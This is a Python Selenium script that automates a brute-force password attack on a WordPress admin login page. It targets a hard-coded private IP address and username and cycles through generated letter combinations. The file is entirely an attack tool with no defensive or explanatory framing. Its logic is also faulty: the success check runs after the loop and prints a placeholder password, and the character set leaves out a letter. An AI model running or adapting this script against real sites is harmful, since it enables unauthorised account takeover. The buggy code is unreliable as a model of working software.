# Lets you attempt a wordpress admin panel login automatically

from selenium import webdriver
import time
class Login:

    URL = 'http://10.225.147.156/wp-login.php'
    passwordDictionary = []
    charList = "abcdefghijklmnopqrstuwxkyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    username = "sigurda"
    password = "test"
    websiteDriver = None
    service = None

    def __init__(self):
        self.websiteDriver = webdriver.Chrome()
        self.generatePasswords()

    def generatePasswords(self):
        for current in range(5):
            self.passwordDictionary = [i for i in self.charList]
            for y in range(current):
                self.passwordDictionary = [current + i for i in self.charList for current in self.passwordDictionary]

    def bruteForcer(self):
        self.websiteDriver.get(self.URL)

        for password in self.passwordDictionary:
            if len(password) > 3:

                username_input = self.websiteDriver.find_element_by_id("user_login")
                username_input.send_keys(self.username)

                password_input = self.websiteDriver.find_element_by_id("user_pass")
                password_input.send_keys(password)

                login_attempt = self.websiteDriver.find_element_by_xpath("//*[@type='submit']")
                login_attempt.submit()

        if self.websiteDriver.find_element_by_id("wp-submit"):
            print("The login was unsuccessful with password " + self.password + " and the username " + self.username)
        else:
            print("The login was successfull! the password for user: " + self.username + " is: " + self.password)
        self.websiteDriver.save_screenshot('screen.png')
        self.websiteDriver.quit()


Login().bruteForcer()
